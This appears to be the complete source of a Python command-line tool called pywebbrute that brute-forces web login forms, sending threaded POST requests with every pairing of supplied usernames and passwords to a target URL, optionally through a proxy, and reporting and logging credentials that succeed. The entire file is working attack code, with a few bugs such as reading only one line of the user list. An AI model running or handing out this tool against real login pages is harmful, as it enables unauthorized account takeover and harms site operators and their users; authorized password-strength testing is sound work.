#!/usr/bin/env python3

import argparse
import sys
from pathlib import Path
import threading
from threading import Thread, Lock
from queue import Queue
import requests
import time
import socket
import base64
from os.path import join

DEFAULT_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded'
}

class Worker(Thread):
    """ Thread executing tasks from a given tasks queue """
    def __init__(self, queue, verbose=0):
        Thread.__init__(self)
        self.verbose = verbose
        self.queue = queue
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.queue.get()
            if self.verbose > 3:
                print("[*] worker: getting task from queue", args)
            # try:
                # if self.verbose > 3:
                    # print("[*] worker: executing task from queue", args)
            func(*args, **kargs)
            # except Exception as e:
                # if self.verbose > 3:
                #     print("[*] worker: error occurred in task", args)
            if self.verbose > 3:
                print("[*] worker: mark task as done", args)
            self.queue.task_done()

class ThreadPool:
    """ Pool of threads consuming tasks from a queue """
    def __init__(self, num_threads, verbose=0):
        self.verbose = verbose
        self.queue = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.queue, verbose)

    def add_task(self, func, *args, **kargs):
        """ Add a task to the queue """
        self.queue.put((func, args, kargs))

    def map(self, func, args_list, **kwargs):
        """ Add a list of tasks to the queue """
        for args in args_list:
            self.add_task(func, args, **kwargs)

    def wait_completion(self):
        """ Wait for completion of all the tasks in the queue """
        self.queue.join()



# The threader thread pulls an worker from the queue and processes it

class QueueManager(object):

    def __init__(self, handler, verbose=0):
        self.errors = []
        self.verbose = verbose
        self.handler = handler

    def handle(self, *args, **kwargs):
        try:
            self.handler(*args, **kwargs)
        except Exception as e:
            self.errors.append(e)
            raise e

def merge_headers(target, custom_headers):
    if custom_headers:
        for kv_array in custom_headers:
            key = kv_array[0]
            val = kv_array[1]
            target[key] = val
    return target

def merge_credentials(usernames, passwords):
    creds = []
    for u in usernames:
        # very bad, fix this later
        for p in passwords:
            cred = (u, p)
            creds.append(cred)
    return creds

def resolve_usernames(args):
    users = []
    if args.user:
        for u in args.user:
            users.append(u)

    if args.user_list:
        user_file = Path(args.user_list)
        if not user_file.is_file():
            print("[!] user list file not found, exiting..")
            sys.exit(1)
        with user_file.open() as f:
            users.append(f.readline())
    if not users:
        print("[!] no users found, exiting...")
        sys.exit(1)

    return users

def resolve_passwords(args):
    passwords = []
    if args.password:
        for u in args.password:
            passwords.append(u)

    if args.password_list:
        password_file = Path(args.password_list)
        if not password_file.is_file():
            print("[!] password list file not found, exiting..")
            sys.exit(1)
        with password_file.open() as f:
            for line in f:
                passwords.append(line.strip())

    if not passwords:
        print("[!] no passwords found, exiting...")
        sys.exit(1)

    return passwords


def _make_attempt(url, username, password, username_key="username", password_key="password", method="post", headers=None, timeout=10, proxy=None, verbose=3):
    if method == 'post':
        try:
            kwargs = {
                'headers': headers,
                'data': {
                    username_key: username,
                    password_key: password
                }
            }
            if proxy:
                kwargs['proxies'] = {
                    'http': 'http://{}'.format(proxy),
                    'https': 'https://{}'.format(proxy)
                }
            res = requests.post(
                url,
                **kwargs
            )
            return res

        except Exception as e:
            if verbose > 3:
                print('[!] bruteforce: error', e)
            raise e

def _parse_response(res, good_codes, bad_codes, needle):

    if needle:
        if verbose > 2:
            print('[*] bruteforce:parsing:needle')
        if needle.search(res.text):
            return True
        return False
    elif good_codes:
        if verbose > 3:
            print('[*] bruteforce:parsing:good-codes')
        if res.status_code in good_codes:
            return True
    elif bad_codes:
        if verbose > 3:
            print('[*] bruteforce:parsing:bad-codes')
        if res.status_code not in bad_codes:
            return True
    return False

def log_response(log_responses_dir, credential, res):
    log_responses_dir_hd = Path(log_responses_dir)
    log_filename = '{}:{}'.format(credential[0], credential[1])
    b64filename = str(base64.b64encode(log_filename.encode()).decode().replace('/', '_').replace('=','-')) + ".txt"
    reponse_log_path = join(log_responses_dir, b64filename)
    reponse_log_path_file = Path(reponse_log_path)
    if not reponse_log_path_file.is_file():
        reponse_log_path_file.touch()
    reponse_log_path_file.write_text(res.text, 'utf-8')

def bruteforce(credential, url, username_key="username", password_key="password", method="post", headers=None, timeout=10, verbose=3, needle=None, good_codes=None, bad_codes=None, proxy=None, log_responses_dir=None):
    username = credential[0]
    password = credential[1]

    if verbose > 2:
        print('[*] bruteforce: attempting {}:{}'.format(username, password))

    res = _make_attempt(url, username, password, username_key, password_key, method, headers, timeout, proxy, verbose)

    success = _parse_response(res, good_codes, bad_codes, needle)

    if success:
        if log_responses_dir:
            log_response(join(log_responses_dir, 'success'), credential, res)
        print('[!!!] SUCCESS: {}:{}'.format(username, password))
        return credential, res
    else:
        if log_responses_dir:
            log_response(join(log_responses_dir, 'failed'), credential, res)
        if verbose > 3:
            print('[*] bruteforce: failed {}:{}'.format(username, password))
        return credential, None


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', action="store", help="url", required=True)

    parser.add_argument('-u', '--user', action="append", help="username")
    parser.add_argument('-L', '--user-list', action="store", help="password")
    parser.add_argument('-U', '--user-param', action="store", help="username parameter", default="username")

    parser.add_argument('-p', '--password', action="append", help="password")
    parser.add_argument('-l', '--password-list', action="store", help="password list")
    parser.add_argument('-P', '--password-param', action="store", help="password parameter", default="password")

    parser.add_argument('-H', '--header', nargs=2, action="append", help="headers")
    parser.add_argument('-T', '--threads', type=int, default=10)
    parser.add_argument('--needle', type=str, default=None, help="needle (regex)")
    parser.add_argument('-b', '--bad-code', type=int, action='append', default=None, help="bad http codes")
    parser.add_argument('-g', '--good-code', type=int, action='append', default=None, help="good http codes")

    parser.add_argument('--timeout', type=int, default=10)
    parser.add_argument('--verbose', '-v', action='count',default=0)
    parser.add_argument('--proxy', action='store', default=None)
    parser.add_argument('--log-responses', action='store', default=None)

    args = parser.parse_args()

    usernames = resolve_usernames(args)
    passwords = resolve_passwords(args)

    headers = merge_headers(DEFAULT_HEADERS, args.header)

    credentials = merge_credentials(usernames, passwords)
    url = args.url

    username_key = args.user_param
    password_key = args.password_param
    verbose = args.verbose
    threads = args.threads
    timeout = args.timeout
    method = 'post'
    print("[*] pywebbrute starting")
    print("[*] url", url)
    print("[*] credentials", len(credentials), 'total')
    log_responses_dir = args.log_responses
    if log_responses_dir:
        print("[*] response log directory", log_responses_dir)
        log_responses_dir_hd = Path(log_responses_dir)
        if not log_responses_dir_hd.is_dir():
            log_responses_dir_hd.mkdir()
        log_responses_dir_hd_success = Path(join(log_responses_dir, 'success'))
        if not log_responses_dir_hd_success.is_dir():
            log_responses_dir_hd_success.mkdir()
        log_responses_dir_hd_failed = Path(join(log_responses_dir, 'failed'))
        if not log_responses_dir_hd_failed.is_dir():
            log_responses_dir_hd_failed.mkdir()

    bad_codes = args.bad_code
    if bad_codes:
        print("[*] bad codes", bad_codes)

    good_codes = args.good_code

    needle = args.needle
    if needle:
        print("[*] needle", needle)

    if not needle and not bad_codes and not good_codes:
        good_codes = [200, 201, 202]

    if good_codes:
        print("[*] good codes", good_codes)

    print("[*] timeout", timeout)
    print("[*] verbosity", verbose)

    proxy = args.proxy

    if proxy:
        print("[*] proxy", proxy)

    if args.threads < 2:
        for credential in credentials:
            bruteforce(credentials, url=url, username_key=username_key, password_key=password_key, headers=headers, timeout=timeout, verbose=verbose, needle=needle, good_codes=good_codes, bad_codes=bad_codes, proxy=proxy, log_responses_dir=log_responses_dir)
    else:
        print("[*] threads", str(threads))
        manager = QueueManager(bruteforce)
        pool = ThreadPool(threads, verbose=verbose)
        pool.map(manager.handle, credentials, url=url, username_key=username_key, password_key=password_key, headers=headers, timeout=timeout, verbose=verbose, needle=needle, good_codes=good_codes, bad_codes=bad_codes, proxy=proxy, log_responses_dir=log_responses_dir)
        pool.wait_completion()
        print('[*] finished')
        if manager.errors:
            print('[!] errors:', len(manager.errors), 'total')
            for e in manager.errors:
                print('=>', e)
